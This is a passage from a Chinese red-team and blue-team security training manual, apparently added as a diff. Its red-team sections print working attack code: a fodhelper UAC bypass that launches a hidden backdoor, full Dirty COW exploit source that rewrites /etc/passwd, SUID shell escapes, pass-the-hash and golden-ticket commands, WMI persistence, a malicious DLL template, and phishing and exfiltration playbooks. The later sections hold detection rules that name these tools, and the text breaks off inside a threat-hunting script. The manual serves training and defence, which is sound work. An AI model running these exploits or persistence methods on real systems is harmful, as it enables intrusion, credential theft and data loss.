+beacon&gt; rportfwd 8080 127.0.0.1 80
+</code></pre>
+<h3 id="23-权限提升"><a class="header" href="#23-权限提升">2.3 权限提升</a></h3>
+<h4 id="windows权限提升"><a class="header" href="#windows权限提升">Windows权限提升</a></h4>
+<p><strong>UAC绕过技术</strong>:</p>
+<pre><code class="language-powershell"># fodhelper.exe UAC绕过（Win10）
+function Invoke-FodhelperBypass {
+    param([String]$Command)
+
+    # 创建注册表项
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
+
+    # 触发UAC绕过
+    Start-Process "C:\Windows\System32\fodhelper.exe"
+
+    # 清理痕迹
+    Start-Sleep -Seconds 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+}
+
+# 使用示例
+Invoke-FodhelperBypass -Command "powershell.exe -NoP -W Hidden -Exec Bypass -File C:\backdoor.ps1"
+</code></pre>
+<p><strong>服务权限滥用</strong>:</p>
+<pre><code class="language-powershell"># PowerUp枚举
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+# 可滥用的服务类型
+function Find-VulnerableServices {
+    # 1. Unquoted服务路径
+    Get-WmiObject -Class Win32_Service | Where-Object {
+        $_.PathName -notmatch '^"' -and
+        $_.PathName -match ' ' -and
+        $_.StartMode -eq 'Auto'
+    } | Select-Object Name, PathName, StartMode, State
+
+    # 2. 可写服务二进制
+    Get-ServiceUnquoted | Where-Object {
+        Test-Path $_.Path -PathType Leaf
+    } | ForEach-Object {
+        $acl = Get-Acl $_.Path
+        if ($acl.Access | Where-Object {
+            $_.FileSystemRights -match 'Write|FullControl' -and
+            $_.IdentityReference -match 'Users|Everyone'
+        }) {
+            $_.Name
+        }
+    }
+
+    # 3. 可修改服务配置
+    Get-Service | ForEach-Object {
+        $svc = $_
+        $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
+        if ($acl.Access | Where-Object {
+            $_.RegistryRights -match 'Write|FullControl' -and
+            $_.IdentityReference -match 'Users|Everyone'
+        }) {
+            $svc.Name
+        }
+    }
+}
+
+# 利用unquoted服务路径
+# 服务路径: C:\Program Files\Vulnerable Service\service.exe
+# 尝试创建: C:\Program.exe
+Copy-Item backdoor.exe "C:\Program.exe"
+Restart-Service VulnerableService
+</code></pre>
+<h4 id="linux权限提升"><a class="header" href="#linux权限提升">Linux权限提升</a></h4>
+<p><strong>内核漏洞利用</strong>:</p>
+<pre><code class="language-bash">#!/bin/bash
+# Dirty COW (CVE-2016-5195) 利用脚本
+
+# 检查内核版本
+uname -r
+# 易受影响版本: Linux 2.6.22 - 4.8.3
+
+# 编译exploit
+cat &gt; dirtycow.c &lt;&lt; 'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+
+void *map;
+int f;
+struct stat st;
+char *name;
+
+void *madviseThread(void *arg) {
+    char *str = (char *)arg;
+    int i, c = 0;
+    for(i = 0; i &lt; 100000000; i++) {
+        c += madvise(map, 100, MADV_DONTNEED);
+    }
+}
+
+void *procselfmemThread(void *arg) {
+    char *str = (char *)arg;
+    int f = open("/proc/self/mem", O_RDWR);
+    int i, c = 0;
+    for(i = 0; i &lt; 100000000; i++) {
+        lseek(f, (uintptr_t) map, SEEK_SET);
+        c += write(f, str, strlen(str));
+    }
+}
+
+int main(int argc, char *argv[]) {
+    pthread_t pth1, pth2;
+    f = open(argv[1], O_RDONLY);
+    fstat(f, &amp;st);
+    name = argv[1];
+    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+    pthread_create(&amp;pth1, NULL, madviseThread, argv[2]);
+    pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]);
+
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+    return 0;
+}
+EOF
+
+gcc -pthread dirtycow.c -o dirtycow
+./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
+</code></pre>
+<p><strong>SUID滥用</strong>:</p>
+<pre><code class="language-bash"># 查找所有SUID程序
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# GTFOBins滥用示例
+# vim SUID提权
+vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+# find SUID提权
+find . -exec /bin/sh -p \; -quit
+
+# nmap SUID提权（旧版本）
+nmap --interactive
+!sh
+
+# python SUID提权
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# perl SUID提权
+perl -e 'exec "/bin/sh";'
+
+# awk SUID提权
+awk 'BEGIN {system("/bin/sh")}'
+</code></pre>
+<h3 id="24-横向移动"><a class="header" href="#24-横向移动">2.4 横向移动</a></h3>
+<h4 id="pass-the-hash攻击"><a class="header" href="#pass-the-hash攻击">Pass-the-Hash攻击</a></h4>
+<p><strong>Impacket工具集</strong>:</p>
+<pre><code class="language-bash"># 使用NTLM哈希进行横向移动
+
+# PsExec
+psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+
+# WMIExec
+wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+
+# SMBExec
+smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+
+# AtExec（计划任务）
+atexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10 "whoami"
+
+# DCOMExec
+dcomexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+
+# 提取哈希
+secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+</code></pre>
+<p><strong>CrackMapExec批量攻击</strong>:</p>
+<pre><code class="language-bash"># 安装CrackMapExec
+pipx install crackmapexec
+
+# 批量密码喷洒
+crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!'
+
+# Pass-the-Hash批量
+crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# 批量执行命令
+crackmapexec smb 192.168.1.0/24 -u administrator -H hash -x "whoami"
+
+# 提取SAM
+crackmapexec smb 192.168.1.10 -u administrator -H hash --sam
+
+# 提取LSA Secrets
+crackmapexec smb 192.168.1.10 -u administrator -H hash --lsa
+
+# 枚举共享
+crackmapexec smb 192.168.1.0/24 -u administrator -H hash --shares
+
+# 枚举登录用户
+crackmapexec smb 192.168.1.0/24 -u administrator -H hash --lusers
+
+# 模块使用
+crackmapexec smb 192.168.1.10 -u administrator -H hash -M mimikatz
+crackmapexec smb 192.168.1.10 -u administrator -H hash -M lsassy
+</code></pre>
+<h4 id="kerberos攻击"><a class="header" href="#kerberos攻击">Kerberos攻击</a></h4>
+<p><strong>Kerberoasting</strong>:</p>
+<pre><code class="language-powershell"># PowerView枚举SPN账户
+Import-Module .\PowerView.ps1
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+# 请求服务票据
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"
+
+# 导出票据
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# 离线破解
+# 使用Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# 使用Impacket
+GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password
+
+# Hashcat破解
+hashcat -m 13100 hashes.txt wordlist.txt
+</code></pre>
+<p><strong>Golden Ticket攻击</strong>:</p>
+<pre><code class="language-powershell"># 1. 提取krbtgt哈希
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.com /user:krbtgt"'
+
+# 2. 获取域SID
+Get-ADDomain | Select-Object DomainSID
+
+# 3. 生成Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt"'
+
+# 4. 验证访问
+dir \\dc\c$
+</code></pre>
+<p><strong>Silver Ticket攻击</strong>:</p>
+<pre><code class="language-powershell"># 生成特定服务票据
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:machine_ntlm_hash /ptt"'
+
+# 访问目标服务
+dir \\server\c$
+</code></pre>
+<h3 id="25-持久化技术"><a class="header" href="#25-持久化技术">2.5 持久化技术</a></h3>
+<h4 id="windows持久化"><a class="header" href="#windows持久化">Windows持久化</a></h4>
+<p><strong>WMI事件订阅</strong>:</p>
+<pre><code class="language-powershell"># 创建WMI持久化
+$FilterArgs = @{
+    name='SystemBootFilter'
+    EventNameSpace='root\CimV2'
+    QueryLanguage='WQL'
+    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs
+
+$ConsumerArgs = @{
+    name='SystemBootConsumer'
+    CommandLineTemplate='powershell.exe -NoP -W Hidden -Exec Bypass -enc &lt;base64_payload&gt;'
+}
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
+
+$FilterToConsumerArgs = @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs
+
+# 清理WMI持久化（用于测试后清理）
+Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemBootConsumer'" | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
+</code></pre>
+<p><strong>DLL劫持</strong>:</p>
+<pre><code class="language-c">// 恶意DLL模板
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
+        case DLL_PROCESS_ATTACH:
+            // 执行恶意代码
+            system("powershell.exe -enc &lt;base64_payload&gt;");
+
+            // 加载原始DLL（避免程序崩溃）
+            LoadLibrary("C:\\Windows\\System32\\original_dll.dll");
+            break;
+
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+
+// 导出原DLL的所有函数（使用.def文件）
+/*
+LIBRARY malicious_dll
+EXPORTS
+    Function1=original_dll.Function1
+    Function2=original_dll.Function2
+*/
+
+// 编译
+// x86: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /DEF:exports.def
+// x64: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /MACHINE:X64 /DEF:exports.def
+</code></pre>
+<h3 id="26-红队攻击剧本库playbook-library"><a class="header" href="#26-红队攻击剧本库playbook-library">2.6 红队攻击剧本库（Playbook Library）</a></h3>
+<blockquote>
+<p>所有剧本仅用于授权演练，请在隔离环境中练习。</p>
+</blockquote>
+<h4 id="剧本-rt-001钓鱼--vpn-凭证滥用--内网渗透"><a class="header" href="#剧本-rt-001钓鱼--vpn-凭证滥用--内网渗透">剧本 #RT-001：钓鱼 → VPN 凭证滥用 → 内网渗透</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>阶段</th><th>目标</th><th>工具/命令</th><th>产出</th><th>安全阈值</th></tr></thead><tbody>
+<tr><td>Recon</td><td>收集组织邮箱格式、技术栈</td><td><code>theHarvester -d corp.com -b linkedin</code></td><td>邮箱列表、职位信息</td><td>不主动触达目标资产</td></tr>
+<tr><td>Weaponize</td><td>制作钓鱼页面、凭证转发</td><td>Gophish、Evilginx2</td><td>钓鱼站点、SSL证书</td><td>钓鱼域名与生产域名相似度控制 &lt;80%</td></tr>
+<tr><td>Delivery</td><td>批量发送个性化邮件</td><td>Gophish活动</td><td>发信日志、打开率</td><td>单批次不超过50封</td></tr>
+<tr><td>Exploit</td><td>捕获凭证 + MFA Token</td><td>Evilginx2日志</td><td>有效登录凭证</td><td>限制登录尝试次数&lt;3</td></tr>
+<tr><td>Installation</td><td>使用凭证登录VPN</td><td><code>openvpn --config corp.ovpn --auth-user-pass creds.txt</code></td><td>VPN会话日志、IP</td><td>登录后立即通知白队</td></tr>
+<tr><td>C2</td><td>部署Beacon</td><td><code>beacon.exe</code> / <code>powershell -enc ...</code></td><td>受控主机</td><td>Beacon心跳间隔≥60s</td></tr>
+<tr><td>Action</td><td>横向渗透、数据访问</td><td>BloodHound、CrackMapExec、Rubeus</td><td>凭证、拓扑、数据包</td><td>对敏感数据库仅只读</td></tr>
+</tbody></table>
+</div>
+<p><strong>关键日志样例</strong>：</p>
+<pre><code>2024-04-12 10:21:33 [phish] Email opened by alice@corp.com
+2024-04-12 10:21:45 [phish] Credential submitted: alice@corp.com / ********
+2024-04-12 10:22:06 [evilginx] Captured MFA token: 123456
+2024-04-12 10:22:50 [vpn] New connection from 45.77.x.x user alice
+</code></pre>
+<p><strong>回滚计划</strong>：</p>
+<ol>
+<li>终止VPN会话；</li>
+<li>提交凭证重置清单；</li>
+<li>删除钓鱼站点、销毁C2实例；</li>
+<li>更新演练证据。</li>
+</ol>
+<h4 id="剧本-rt-002web漏洞链--内网跳板--数据渗出"><a class="header" href="#剧本-rt-002web漏洞链--内网跳板--数据渗出">剧本 #RT-002：Web漏洞链 → 内网跳板 → 数据渗出</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>步骤</th><th>操作</th><th>命令/脚本</th><th>预期结果</th></tr></thead><tbody>
+<tr><td>1. 信息收集</td><td>确认Web组件与框架</td><td><code>whatweb -a 3 portal.corp.com</code></td><td>识别到Struts2组件</td></tr>
+<tr><td>2. 漏洞利用</td><td>利用CVE-2017-5638执行命令</td><td><code>python exploit.py --url https://portal.corp.com --cmd "whoami"</code></td><td>拿到WebShell</td></tr>
+<tr><td>3. 权限提升</td><td>查找敏感配置</td><td><code>grep -R "password" /opt/app/conf</code></td><td>获取数据库账户</td></tr>
+<tr><td>4. 内网透视</td><td>通过数据库服务器横向</td><td><code>sshpass -p 'Passw0rd' ssh db@10.10.20.5</code></td><td>进入内网</td></tr>
+<tr><td>5. 凭证收集</td><td>Mimikatz/Seatbelt</td><td><code>Invoke-Mimikatz -Command "sekurlsa::logonpasswords"</code></td><td>域凭证</td></tr>
+<tr><td>6. 横向移动</td><td>PsExec/WMI</td><td><code>wmiexec.py domain/admin:hash@10.10.20.10</code></td><td>进入文件服务器</td></tr>
+<tr><td>7. 数据渗出</td><td>压缩并传出</td><td><code>7z a finance.7z /data/finance/*.xls</code> + <code>powershell Invoke-WebRequest</code></td><td>数据样本</td></tr>
+</tbody></table>
+</div>
+<p><strong>隐蔽措施</strong>：使用<code>netsh interface portproxy</code>搭建转发、<code>certutil -encode</code>伪装payload、删除临时文件、控制数据大小&lt;10MB并分片。</p>
+<h4 id="剧本-rt-003云环境攻陷aws"><a class="header" href="#剧本-rt-003云环境攻陷aws">剧本 #RT-003：云环境攻陷（AWS）</a></h4>
+<ol>
+<li>获取凭证：在Git泄露仓库中找到<code>AWS_ACCESS_KEY_ID</code>与<code>AWS_SECRET_ACCESS_KEY</code>。</li>
+<li>身份验证：<code>aws sts get-caller-identity --profile compromised</code>。</li>
+<li>权限枚举：<code>aws iam list-attached-user-policies --user-name compromised-user</code>。</li>
+<li>资源探索：<code>aws s3 ls</code>、<code>aws ec2 describe-instances</code>、<code>aws lambda list-functions</code>。</li>
+<li>权限提升：<code>aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name RedTeamSession</code>。</li>
+<li>持久化：创建短期Token或Access Key（需登记），设置CloudTrail告警。</li>
+<li>清理：删除多余资源，由白队核对CloudTrail日志。</li>
+</ol>
+<h4 id="剧本-rt-004工控ot场景仿真"><a class="header" href="#剧本-rt-004工控ot场景仿真">剧本 #RT-004：工控/OT场景（仿真）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>环节</th><th>目标</th><th>操作</th><th>注意事项</th></tr></thead><tbody>
+<tr><td>IT侧渗透</td><td>进入堡垒机或MES系统</td><td>Web漏洞/钓鱼</td><td>使用仿真环境，禁止影响生产</td></tr>
+<tr><td>OT网络透视</td><td>识别PLC工程站</td><td><code>nmap -sU -p 502,20000 10.60.0.0/24</code></td><td>仅对仿真站点扫描，并提前备案</td></tr>
+<tr><td>协议分析</td><td>Modbus/TCP读取线圈</td><td><code>python modbus-read.py --host 10.60.0.10 --addr 1 --count 10</code></td><td>禁止写命令、操作前确认</td></tr>
+<tr><td>数据取证</td><td>导出工艺图纸</td><td>只访问教学用文件夹</td><td>必须有现场工程师陪同</td></tr>
+</tbody></table>
+</div>
+<h3 id="27-红队知识库建设"><a class="header" href="#27-红队知识库建设">2.7 红队知识库建设</a></h3>
+<ul>
+<li>建立<code>/redteam/playbooks</code>仓库，按照<code>年份-场景</code>命名并维护CHANGELOG。</li>
+<li>每个剧本包含：目标背景、前提条件、操作步骤、命令、风险、检测假设、回滚方案。</li>
+<li>与蓝队同步“检测假设”部分，便于对齐预期告警点。</li>
+<li>定期复盘剧本效果，标记“成功/失败/需优化”，形成版本历史。</li>
+</ul>
+<hr />
+<h2 id="模块三蓝队防御体系"><a class="header" href="#模块三蓝队防御体系">模块三：蓝队防御体系</a></h2>
+<h3 id="模块总览蓝队视角"><a class="header" href="#模块总览蓝队视角">模块总览（蓝队视角）</a></h3>
+<ul>
+<li><strong>关键目标</strong>：构建涵盖检测、响应、复盘、改进的闭环体系，实现对红队TTP的高覆盖、高命中与低误报。</li>
+<li><strong>能力要素</strong>：
+<ul>
+<li><strong>检测工程（Detection Engineering）</strong>：基于MITRE &amp; ATT&amp;CK覆盖率设计规则、仪表板。</li>
+<li><strong>威胁狩猎（Threat Hunting）</strong>：假设驱动、数据驱动、情报驱动三种模式并行。</li>
+<li><strong>应急响应（IR）</strong>：NIST流程、Playbook、自动化编排（SOAR）。</li>
+<li><strong>取证分析</strong>：内存/磁盘/网络/日志多维取证能力。</li>
+</ul>
+</li>
+<li><strong>模块产出</strong>：
+<ul>
+<li>检测规则库（Sigma/YARA/EDR自定义规则）</li>
+<li>SOC运行手册、告警分级标准、值班排班表</li>
+<li>Threat Hunting 报告模板与自动化脚本</li>
+<li>事件复盘报告、行动项跟踪表</li>
+</ul>
+</li>
+</ul>
+<h4 id="蓝队能力雷达图自评"><a class="header" href="#蓝队能力雷达图自评">蓝队能力雷达图（自评）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>能力项</th><th>1分</th><th>3分</th><th>5分</th></tr></thead><tbody>
+<tr><td>可见性（Visibility）</td><td>关键日志缺失</td><td>主要系统接入日志平台</td><td>全量日志覆盖+资产标签</td></tr>
+<tr><td>检测精度</td><td>大量误报</td><td>关键行为有规则</td><td>数据科学+情报驱动动态更新</td></tr>
+<tr><td>响应速度</td><td>&gt;24小时</td><td>4-8小时</td><td>&lt;1小时自动化响应</td></tr>
+<tr><td>自动化水平</td><td>手工处理</td><td>半自动编排</td><td>SOAR闭环联动</td></tr>
+<tr><td>取证能力</td><td>单一终端</td><td>多源取证</td><td>云/容器/工控全覆盖</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>每季度根据演练结果更新评分，结合红队反馈建立“防御迭代Backlog”。</p>
+</blockquote>
+<h3 id="31-威胁检测"><a class="header" href="#31-威胁检测">3.1 威胁检测</a></h3>
+<h4 id="siem系统部署"><a class="header" href="#siem系统部署">SIEM系统部署</a></h4>
+<p><strong>Splunk配置</strong>:</p>
+<pre><code class="language-bash"># 安装Splunk
+wget -O splunk-9.0.0-linux-x86_64.tgz 'https://download.splunk.com/...'
+tar xvzf splunk-9.0.0-linux-x86_64.tgz -C /opt
+cd /opt/splunk/bin
+./splunk start --accept-license
+
+# 配置数据输入
+[monitor:///var/log/auth.log]
+disabled = false
+index = linux_security
+sourcetype = linux_secure
+
+[monitor:///var/log/syslog]
+disabled = false
+index = linux_os
+sourcetype = syslog
+
+# Windows日志收集
+[WinEventLog://Security]
+disabled = false
+index = windows_security
+checkpointInterval = 5
+
+[WinEventLog://System]
+disabled = false
+index = windows_system
+checkpointInterval = 5
+
+# Sysmon配置
+&lt;Sysmon schemaversion="4.82"&gt;
+  &lt;EventFiltering&gt;
+    &lt;!-- 进程创建监控 --&gt;
+    &lt;ProcessCreate onmatch="include"&gt;
+      &lt;CommandLine condition="contains"&gt;powershell&lt;/CommandLine&gt;
+      &lt;CommandLine condition="contains"&gt;cmd&lt;/CommandLine&gt;
+      &lt;CommandLine condition="contains"&gt;wscript&lt;/CommandLine&gt;
+    &lt;/ProcessCreate&gt;
+
+    &lt;!-- 网络连接监控 --&gt;
+    &lt;NetworkConnect onmatch="include"&gt;
+      &lt;DestinationPort condition="is"&gt;4444&lt;/DestinationPort&gt;
+      &lt;DestinationPort condition="is"&gt;5555&lt;/DestinationPort&gt;
+    &lt;/NetworkConnect&gt;
+
+    &lt;!-- 文件创建监控 --&gt;
+    &lt;FileCreate onmatch="include"&gt;
+      &lt;TargetFilename condition="contains"&gt;\Temp\&lt;/TargetFilename&gt;
+      &lt;TargetFilename condition="contains"&gt;\AppData\&lt;/TargetFilename&gt;
+    &lt;/FileCreate&gt;
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
+</code></pre>
+<p><strong>Splunk检测规则</strong>:</p>
+<pre><code class="language-spl"># 检测Mimikatz使用
+index=windows_security EventCode=4688
+(CommandLine="*mimikatz*" OR CommandLine="*sekurlsa*" OR CommandLine="*lsadump*")
+| stats count by Computer, User, CommandLine
+| where count &gt; 0
+
+# 检测Pass-the-Hash
+index=windows_security EventCode=4624 LogonType=3
+| stats dc(SourceNetworkAddress) as unique_sources by TargetUserName
+| where unique_sources &gt; 10
+
+# 检测PowerShell混淆
+index=windows_security EventCode=4104
+(ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64String*" OR ScriptBlockText="*Invoke-Expression*")
+| stats count by Computer, ScriptBlockText
+| head 20
+
+# 检测异常网络连接
+index=sysmon EventCode=3
+DestinationPort IN (4444, 5555, 6666, 7777)
+| stats count by SourceIp, DestinationIp, DestinationPort
+| where count &gt; 5
+
+# 检测Kerberoasting
+index=windows_security EventCode=4769 TicketEncryptionType=0x17
+| stats count by TargetUserName, ServiceName
+| where count &gt; 10
+
+# 检测Golden Ticket
+index=windows_security EventCode=4624 LogonType=3
+TargetUserName="Administrator"
+| stats dc(SourceNetworkAddress) as unique_ips by TargetUserName
+| where unique_ips &gt; 20
+</code></pre>
+<h4 id="elk-stack部署"><a class="header" href="#elk-stack部署">ELK Stack部署</a></h4>
+<p><strong>Elasticsearch配置</strong>:</p>
+<pre><code class="language-yaml"># elasticsearch.yml
+cluster.name: security-monitoring
+node.name: elk-node-1
+path.data: /var/lib/elasticsearch
+path.logs: /var/log/elasticsearch
+network.host: 0.0.0.0
+http.port: 9200
+discovery.type: single-node
+
+xpack.security.enabled: true
+xpack.security.transport.ssl.enabled: true
+</code></pre>
+<p><strong>Logstash配置</strong>:</p>
+<pre><code class="language-ruby"># logstash.conf
+input {
+  beats {
+    port =&gt; 5044
+  }
+
+  syslog {
+    port =&gt; 514
+    type =&gt; "syslog"
+  }
+}
+
+filter {
+  # Windows事件日志解析
+  if [winlog][event_id] == 4624 {
+    mutate {
+      add_tag =&gt; ["windows_logon"]
+    }
+  }
+
+  if [winlog][event_id] == 4688 {
+    mutate {
+      add_tag =&gt; ["process_creation"]
+    }
+
+    # 检测可疑进程
+    if [winlog][event_data][CommandLine] =~ /mimikatz|sekurlsa|powershell.*-enc/ {
+      mutate {
+        add_tag =&gt; ["suspicious_process"]
+      }
+    }
+  }
+
+  # Sysmon解析
+  if [winlog][channel] == "Microsoft-Windows-Sysmon/Operational" {
+    if [winlog][event_id] == 1 {
+      mutate { add_tag =&gt; ["sysmon_process_create"] }
+    }
+
+    if [winlog][event_id] == 3 {
+      mutate { add_tag =&gt; ["sysmon_network_connect"] }
+
+      # 检测C2通信
+      if [winlog][event_data][DestinationPort] in [4444, 5555, 6666] {
+        mutate { add_tag =&gt; ["potential_c2"] }
+      }
+    }
+  }
+
+  # GeoIP富化
+  geoip {
+    source =&gt; "src_ip"
+    target =&gt; "geoip"
+  }
+}
+
+output {
+  elasticsearch {
+    hosts =&gt; ["localhost:9200"]
+    index =&gt; "security-logs-%{+YYYY.MM.dd}"
+    user =&gt; "elastic"
+    password =&gt; "password"
+  }
+}
+</code></pre>
+<p><strong>Kibana告警规则</strong>:</p>
+<pre><code class="language-json">{
+  "name": "Mimikatz检测",
+  "type": "query",
+  "query": {
+    "bool": {
+      "must": [
+        {
+          "match": {
+            "winlog.event_id": "4688"
+          }
+        },
+        {
+          "query_string": {
+            "query": "CommandLine:(*mimikatz* OR *sekurlsa* OR *lsadump*)"
+          }
+        }
+      ]
+    }
+  },
+  "actions": [
+    {
+      "type": "email",
+      "to": ["soc@company.com"],
+      "subject": "高危告警：检测到Mimikatz活动",
+      "body": "主机 {{ctx.payload.hits.hits.0._source.Computer}} 检测到Mimikatz使用"
+    },
+    {
+      "type": "webhook",
+      "url": "https://siem.company.com/api/alerts",
+      "method": "POST",
+      "body": "{{ctx.payload}}"
+    }
+  ],
+  "schedule": {
+    "interval": "1m"
+  }
+}
+</code></pre>
+<h3 id="检测工程工作流detection-engineering-workflow"><a class="header" href="#检测工程工作流detection-engineering-workflow">检测工程工作流（Detection Engineering Workflow）</a></h3>
+<ol>
+<li><strong>需求驱动</strong>：根据红队TTP、威胁情报、漏洞公告、合规要求输出检测需求文档（DRD）。</li>
+<li><strong>规则开发</strong>：使用Sigma/YARA/自定义脚本编写规则，定义阈值、字段映射、排除条件。</li>
+<li><strong>实验验证</strong>：在沙箱或测试集群复现红队行为，验证规则命中率与误报率，记录测试数据与日志样本。</li>
+<li><strong>上线评审</strong>：蓝队Lead + 紫队代表评审，确认规则描述、告警级别、响应指南；必要时由白队签字归档。</li>
+<li><strong>部署与监控</strong>：通过CI/CD或SOAR自动发布，设置观察期监控误报，必要时回滚或调整；所有变更写入Changelog。</li>
+<li><strong>知识库沉淀</strong>：将规则、案例、日志样本纳入检测知识库，与红队共享用于下一轮演练佐证检测效果。</li>
+</ol>
+<h4 id="检测覆盖矩阵coverage-matrix"><a class="header" href="#检测覆盖矩阵coverage-matrix">检测覆盖矩阵（Coverage Matrix）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>ATT&amp;CK战术</th><th>关键技术</th><th>数据源</th><th>覆盖规则名称</th><th>告警归类</th></tr></thead><tbody>
+<tr><td>Initial Access</td><td>T1566 钓鱼</td><td>邮件网关、代理日志</td><td><code>Email_Phish_Click</code>, <code>Proxy_Suspicious_URL</code></td><td>高危-社会工程</td></tr>
+<tr><td>Execution</td><td>T1059 PowerShell</td><td>Windows事件4104/4688</td><td><code>PS_EncodedCommand</code>, <code>PS_DownloadString</code></td><td>高危-脚本执行</td></tr>
+<tr><td>Persistence</td><td>T1547 启动项</td><td>Sysmon 13、注册表审核</td><td><code>Registry_Run_Add</code>, <code>ScheduledTask_Create</code></td><td>中危-持久化</td></tr>
+<tr><td>Credential Access</td><td>T1003 凭证转储</td><td>Sysmon 10/4688</td><td><code>Credential_Dump_Tool</code>, <code>LSASS_Access</code></td><td>致命-凭证窃取</td></tr>
+<tr><td>Lateral Movement</td><td>T1021 远程服务</td><td>4624、网络流量</td><td><code>RDP_MultiHost</code>, <code>SMB_PTH</code></td><td>高危-横向移动</td></tr>
+<tr><td>Command &amp; Control</td><td>T1071 应用层协议</td><td>Zeek、代理日志</td><td><code>C2_Suspicious_DNS</code>, <code>Beaconing_HTTP</code></td><td>高危-远程控制</td></tr>
+<tr><td>Exfiltration</td><td>T1041 C2通道</td><td>流量分析、代理日志</td><td><code>Data_Over_HTTPs</code>, <code>Large_Upload</code></td><td>致命-数据泄露</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>目标：ATT&amp;CK战术覆盖率≥80%，核心技术覆盖率≥70%，关键资产检测响应时间&lt;15分钟；每季度滚动评估提升10%。</p>
+</blockquote>
+<h3 id="32-威胁狩猎threat-hunting"><a class="header" href="#32-威胁狩猎threat-hunting">3.2 威胁狩猎（Threat Hunting）</a></h3>
+<h4 id="假设驱动狩猎"><a class="header" href="#假设驱动狩猎">假设驱动狩猎</a></h4>
+<p><strong>狩猎假设制定</strong>:</p>
+<pre><code>假设1: 攻击者可能使用PowerShell进行内存执行
+证据:
+- EventID 4104 (PowerShell脚本块日志)
+- Base64编码命令
+- DownloadString方法调用
+
+假设2: 攻击者可能通过RDP横向移动
+证据:
+- EventID 4624 LogonType=10 (远程交互登录)
+- 短时间内多次RDP登录
+- 非办公时间RDP连接
+
+假设3: 攻击者可能使用Pass-the-Hash
+证据:
+- EventID 4624 LogonType=3 (网络登录)
+- NTLM认证
+- 多个主机使用相同哈希登录
+</code></pre>
+<p><strong>狩猎查询示例</strong>:</p>
+<pre><code class="language-python"># 威胁狩猎自动化脚本
+import pandas as pd
+from elasticsearch import Elasticsearch
+
+class ThreatHunter:
+    def __init__(self, es_host):
+        self.es = Elasticsearch([es_host])
+
+    def hunt_powershell_obfuscation(self):
+        """
+        狩猎PowerShell混淆
+        """
+        query = {
+            "query": {
